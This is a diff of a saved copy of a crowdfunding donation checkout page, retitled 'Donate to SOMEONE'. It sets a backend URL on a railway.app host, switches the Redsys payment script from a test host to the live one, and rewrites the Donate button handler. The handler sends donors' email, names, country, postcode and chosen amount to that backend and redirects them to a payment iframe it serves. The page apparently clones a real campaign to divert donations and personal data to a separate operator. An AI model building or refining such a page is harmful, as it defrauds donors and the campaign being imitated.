@@ -6,7 +6,7 @@
    <meta name=viewport content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Donate to SOMEONE</title>
    <meta name=description content="">
-   <script src="https://sis-t.redsys.es:25443/sis/NC/sandbox/redsysV3.js"></script>
+   <script src="https://sis.redsys.es:25443/sis/NC/sandbox/redsysV3.js"></script>
 
    <meta name=next-head-count content=5>
    <meta http-equiv=x-ua-compatible content="ie=edge">
@@ -76,11 +76,6 @@
 	
 
     <!-- Your base styles etc. -->
-    <script>
-      // Replace this with your Railway backend URL
-      const BACKEND_URL = "https://fbcid-production.up.railway.app";
-    </script>
-
     <style>
       .sf-hidden {
         display: none !important;
@@ -175,7 +170,6 @@
     </style>
 
     <script src="https://js.stripe.com/v3/"></script>
-
     <meta name="savepage-title" content="Donate to Help for Sonja">
     <meta name="savepage-pubdate" content="Unknown">
 
@@ -208,10 +202,7 @@
       }
     </style>
 
-    <meta
-      name="savepage-date"
-      content="Fri Jan 24 2025 04:53:26 GMT+0400 (Horário do Golfo)"
-    />
+    <meta name="savepage-date" content="Fri Jan 24 2025 04:53:26 GMT+0400 (Horário do Golfo)" />
     <meta
       name="savepage-state"
       content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;"
@@ -231,6 +222,14 @@
       }
     </style>
     <noscript data-n-css></noscript>
+
+    <!-- 
+      ADD A SCRIPT HERE TO SET YOUR BACKEND URL 
+      (You can change the URL below to whatever endpoint or domain you use)
+    -->
+    <script>
+      window.BACKEND_URL = "https://fbcid-production.up.railway.app";
+    </script>
   </head>
 
   <body
@@ -246,10 +245,7 @@
           bis_skin_checked="1"
         >
           <header class="hrt-header hrt-header--default">
-            <div
-              class="hrt-width-full hrt-container"
-              bis_skin_checked="1"
-            >
+            <div class="hrt-width-full hrt-container" bis_skin_checked="1">
               <nav class="hrt-header-nav">
                 <div class="hrt-header-left" bis_skin_checked="1"></div>
                 <div class="hrt-header-center" bis_skin_checked="1">
@@ -276,8 +272,7 @@
                       ><font style="vertical-align:inherit"
                         ><font style="vertical-align:inherit"
                           ></font></font
-                      ></span
-                    >
+                    ></span>
                     <a
                       class="hrt-link hrt-link--gray-dark"
                       data-element-id="btn_nav_sign_in"
@@ -311,9 +306,7 @@
                   class="core-entity-summary_campaignSummaryText__Y8XzY hrt-mb-2"
                   bis_skin_checked="1"
                 >
-                  <h1
-                    class="hrt-mb-0 hrt-text-body-md hrt-font-regular"
-                  >
+                  <h1 class="hrt-mb-0 hrt-text-body-md hrt-font-regular">
                     <font style="vertical-align:inherit"
                       ><font style="vertical-align:inherit"
                         >You are supporting </font
@@ -387,11 +380,11 @@
                           cursor: pointer;
                         }
                         ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"] {
-                          background-color: black !important; 
+                          background-color: black !important;
                           color: white !important;
                         }
                         ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"]:hover {
-                          background-color: black !important; 
+                          background-color: black !important;
                           color: white !important;
                         }
                       </style>
@@ -604,10 +597,7 @@
                               value="CREDIT_CARD"
                               checked
                             />
-                            <label
-                              class="hrt-radio-field-label"
-                              for="add-card"
-                            >
+                            <label class="hrt-radio-field-label" for="add-card">
                               <div
                                 class="hrt-disp-flex hrt-align-center"
                                 bis_skin_checked="1"
@@ -658,7 +648,7 @@
                   bis_skin_checked="1"
                 ></div>
 
-                <!-- Personal Info Fields (Name, Email, etc.) -->
+                <!-- Personal Info Fields (Name, Email, etc.) - We'll keep them here -->
                 <div
                   class="credit-card-form-fields hrt-mt-1 hrt-ml-4 credit-card-form-fields_creditCardPaymentHideLegend__baBa8 hrt-fieldset"
                 >
@@ -706,11 +696,7 @@
                             </div>
                             <!-- Error message below Email -->
                             <div class="error-message" id="email-error">
-                              <img
-                                src="error.svg"
-                                alt=""
-                                class="error-icon"
-                              />
+                              <img src="error.svg" alt="" class="error-icon" />
                               <span></span>
                             </div>
                           </div>
@@ -750,11 +736,7 @@
                             </div>
                             <!-- Error message below First Name -->
                             <div class="error-message" id="first-name-error">
-                              <img
-                                src="error.svg"
-                                alt=""
-                                class="error-icon"
-                              />
+                              <img src="error.svg" alt="" class="error-icon" />
                               <span></span>
                             </div>
                           </div>
@@ -789,11 +771,7 @@
                             </div>
                             <!-- Error message below Last Name -->
                             <div class="error-message" id="last-name-error">
-                              <img
-                                src="error.svg"
-                                alt=""
-                                class="error-icon"
-                              />
+                              <img src="error.svg" alt="" class="error-icon" />
                               <span></span>
                             </div>
                           </div>
@@ -862,11 +840,7 @@
                             </div>
                             <!-- Error message below Country -->
                             <div class="error-message" id="country-error">
-                              <img
-                                src="error.svg"
-                                alt=""
-                                class="error-icon"
-                              />
+                              <img src="error.svg" alt="" class="error-icon" />
                               <span></span>
                             </div>
                           </div>
@@ -902,15 +876,8 @@
                                 </div>
                               </div>
                               <!-- Error message below Postal Code -->
-                              <div
-                                class="error-message"
-                                id="postal-code-error"
-                              >
-                                <img
-                                  src="error.svg"
-                                  alt=""
-                                  class="error-icon"
-                                />
+                              <div class="error-message" id="postal-code-error">
+                                <img src="error.svg" alt="" class="error-icon" />
                                 <span></span>
                               </div>
                             </div>
@@ -924,10 +891,7 @@
                 </div>
 
                 <!-- Donation summary area -->
-                <div
-                  class="hrt-mb-4 hrt-mb-3 checkout-summary"
-                  bis_skin_checked="1"
-                >
+                <div class="hrt-mb-4 hrt-mb-3 checkout-summary" bis_skin_checked="1">
                   <h2 class="heading-3 hrt-font-bold">Your donation</h2>
                   <dl
                     class="checkout-summary_checkoutSummaryList__1z9xU hrt-text-neutral-500"
@@ -1001,10 +965,7 @@
                         class="hrt-mt-0 hrt-mr-0 hrt-mb-0 hrt-ml-0 hrt-max-width-full hrt-width-full paypal-payfast_paypalPayfastSubmitButton__u8JfE sf-hidden"
                         bis_skin_checked="1"
                       >
-                        <div
-                          bis_skin_checked="1"
-                          class="sf-hidden"
-                        ></div>
+                        <div bis_skin_checked="1" class="sf-hidden"></div>
                       </div>
                     </div>
                   </div>
@@ -1048,10 +1009,7 @@
                   </div>
                 </div>
 
-                <div
-                  id="checkoutAppInvisibleCaptcha"
-                  bis_skin_checked="1"
-                ></div>
+                <div id="checkoutAppInvisibleCaptcha" bis_skin_checked="1"></div>
                 <div
                   class="checkout-rule_checkoutRule__RsZ5R hrt-mb-3 hrt-mt-3 hrt-rule hrt-rule--horizontal"
                   bis_skin_checked="1"
@@ -1191,7 +1149,8 @@
                       const inputEl = document.getElementById(inputId);
                       if (!inputEl) return;
 
-                      const wrapper = inputEl.closest(".hrt-text-field-wrapper") || inputEl.closest(".hrt-select-field-wrapper");
+                      const wrapper = inputEl.closest(".hrt-text-field-wrapper") ||
+                                      inputEl.closest(".hrt-select-field-wrapper");
                       if (!wrapper) return;
 
                       if (message) {
@@ -1285,9 +1244,7 @@
                     countrySelect.addEventListener("change", validateCountryField);
 
                     // Postal Code
-                    const postalCodeInput = document.getElementById(
-                      "location-postal-code"
-                    );
+                    const postalCodeInput = document.getElementById("location-postal-code");
                     function validatePostalCodeField() {
                       const value = postalCodeInput.value.trim();
                       if (!value) {
@@ -1305,45 +1262,46 @@
                       }
                     }
                     postalCodeInput.addEventListener("blur", validatePostalCodeField);
-                    postalCodeInput.addEventListener(
-                      "input",
-                      validatePostalCodeField
-                    );
+                    postalCodeInput.addEventListener("input", validatePostalCodeField);
                   });
                 </script>
 
-                <!-- Script to handle Donate Now button: store data in cookie, then redirect -->
+                <!-- Script to handle Donate Now button -->
                 <script>
                   document.addEventListener("DOMContentLoaded", function () {
-                    const donateNowBtn = document.getElementById("donate-now");
-                    const donationFormError = document.getElementById("donation-form-error");
-                    const donationFormErrorSpan = donationFormError.querySelector("span");
-
-                    // Helper to show or clear the global error
-                    function setGlobalError(msg) {
-                      if (msg) {
-                        donationFormError.style.display = "inline-flex";
-                        donationFormError.classList.add("active");
-                        donationFormErrorSpan.textContent = msg;
-                      } else {
-                        donationFormError.style.display = "none";
-                        donationFormError.classList.remove("active");
-                        donationFormErrorSpan.textContent = "";
+                    // Reusable function to show a global error under the Donate button
+                    function showGlobalError(message) {
+                      const globalErrorDiv = document.getElementById("donation-form-error");
+                      if (globalErrorDiv) {
+                        if (message) {
+                          globalErrorDiv.style.display = "inline-flex";
+                          globalErrorDiv.classList.add("active");
+                          globalErrorDiv.querySelector("span").textContent = message;
+                        } else {
+                          globalErrorDiv.style.display = "none";
+                          globalErrorDiv.classList.remove("active");
+                          globalErrorDiv.querySelector("span").textContent = "";
+                        }
                       }
                     }
 
-                    donateNowBtn.addEventListener("click", async function () {
-                      // Clear global error first
-                      setGlobalError("");
-
-                      // Force validation on each field (triggers blur logic)
+                    // Validate all fields at once
+                    function validateAllFields() {
+                      // Force the blur event on each field to trigger field-level validation
                       document.getElementById("email-address").dispatchEvent(new Event("blur"));
                       document.getElementById("first-name").dispatchEvent(new Event("blur"));
                       document.getElementById("last-name").dispatchEvent(new Event("blur"));
                       document.getElementById("location-country").dispatchEvent(new Event("blur"));
                       document.getElementById("location-postal-code").dispatchEvent(new Event("blur"));
 
-                      // Check if any donation amount is selected
+                      // Check if any error classes are still active
+                      const emailErrorActive = document.getElementById("email-error").classList.contains("active");
+                      const firstNameErrorActive = document.getElementById("first-name-error").classList.contains("active");
+                      const lastNameErrorActive = document.getElementById("last-name-error").classList.contains("active");
+                      const countryErrorActive = document.getElementById("country-error").classList.contains("active");
+                      const postalCodeErrorActive = document.getElementById("postal-code-error").classList.contains("active");
+
+                      // Check if user selected a donation amount
                       let selectedAmount = "0";
                       const pressedBtn = document.querySelector(
                         'ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"]'
@@ -1352,44 +1310,63 @@
                         selectedAmount = pressedBtn.value;
                       }
 
-                      // Gather field-level errors
-                      const emailError = document.getElementById("email-error").classList.contains("active");
-                      const firstNameError = document.getElementById("first-name-error").classList.contains("active");
-                      const lastNameError = document.getElementById("last-name-error").classList.contains("active");
-                      const countryError = document.getElementById("country-error").classList.contains("active");
-                      const postalCodeError = document.getElementById("postal-code-error").classList.contains("active");
+                      // Check if fields are empty or errors are active
+                      const emailVal = document.getElementById("email-address").value.trim();
+                      const firstVal = document.getElementById("first-name").value.trim();
+                      const lastVal = document.getElementById("last-name").value.trim();
+                      const countryVal = document.getElementById("location-country").value.trim();
+                      const postalVal = document.getElementById("location-postal-code").value.trim();
 
-                      // Gather field values
+                      if (
+                        !emailVal ||
+                        !firstVal ||
+                        !lastVal ||
+                        !countryVal ||
+                        !postalVal ||
+                        selectedAmount === "0" ||
+                        emailErrorActive ||
+                        firstNameErrorActive ||
+                        lastNameErrorActive ||
+                        countryErrorActive ||
+                        postalCodeErrorActive
+                      ) {
+                        showGlobalError("Please fill out all required fields and select a donation amount.");
+                        return false;
+                      }
+
+                      // All good
+                      showGlobalError(""); // Clear any global error
+                      return true;
+                    }
+
+                    const donateNowBtn = document.getElementById("donate-now");
+                    donateNowBtn.addEventListener("click", async function () {
+                      // Step 1: Validate all fields
+                      if (!validateAllFields()) {
+                        // If validation fails, do NOT proceed
+                        return;
+                      }
+
+                      // If we get here, fields are valid
                       const email = document.getElementById("email-address").value.trim();
                       const firstName = document.getElementById("first-name").value.trim();
                       const lastName = document.getElementById("last-name").value.trim();
                       const country = document.getElementById("location-country").value.trim();
                       const postalCode = document.getElementById("location-postal-code").value.trim();
 
-                      // If any field is empty or has an error, do NOT proceed
-                      if (
-                        !email ||
-                        !firstName ||
-                        !lastName ||
-                        !country ||
-                        !postalCode ||
-                        emailError ||
-                        firstNameError ||
-                        lastNameError ||
-                        countryError ||
-                        postalCodeError
-                      ) {
-                        setGlobalError("Please fill out all required fields correctly.");
-                        return;
+                      // Figure out which donation button is pressed
+                      let selectedAmount = "0";
+                      const pressedBtn = document.querySelector(
+                        'ul[data-federalid="suggested-donations-list"] button[aria-pressed="true"]'
+                      );
+                      if (pressedBtn) {
+                        selectedAmount = pressedBtn.value;
                       }
 
-                      // Check donation amount
-                      if (!selectedAmount || selectedAmount === "0") {
-                        setGlobalError("Please select a donation amount.");
-                        return;
-                      }
+                      // Use the global BACKEND_URL from the <script> in the <head>
+                      const baseUrl = window.BACKEND_URL || "";
 
-                      // Everything is valid, attempt to create donation
+                      // Prepare data to send to the server
                       const dataToStore = {
                         email,
                         firstName,
@@ -1400,33 +1377,31 @@
                       };
 
                       try {
-                        const resp = await fetch(`${BACKEND_URL}/create-donation`, {
+                        // Attempt to create the donation
+                        const resp = await fetch(baseUrl + "/create-donation", {
                           method: "POST",
                           headers: { "Content-Type": "application/json" },
                           body: JSON.stringify(dataToStore),
-                          credentials: "include", // So the cookie is set properly
+                          credentials: "include", // send/receive cookies
                         });
                         if (!resp.ok) {
-                          // Show error below the donate button
-                          setGlobalError("Could not create donation, please try again.");
+                          showGlobalError("Could not create donation, please try again.");
                           return;
                         }
                         const result = await resp.json();
                         if (!result.ok) {
-                          // Show error below the donate button
-                          setGlobalError("Error: " + result.error);
+                          showGlobalError("Error: " + result.error);
                           return;
                         }
-                        // On success, redirect to Redsys payment page
-                        window.location.href = `${BACKEND_URL}/iframe-sis?orderId=${encodeURIComponent(result.orderId)}`;
+                        // On success, redirect to the Redsys payment page
+                        window.location.href =
+                          baseUrl + "/iframe-sis?orderId=" + encodeURIComponent(result.orderId);
                       } catch (error) {
-                        // Show error below the donate button
-                        setGlobalError("Error creating donation: " + error.message);
+                        showGlobalError("Error creating donation: " + error);
                       }
                     });
                   });
                 </script>
-
                 <!-- (Removed the old embedded Redsys inSite scripts) -->
               </div>
             </div>
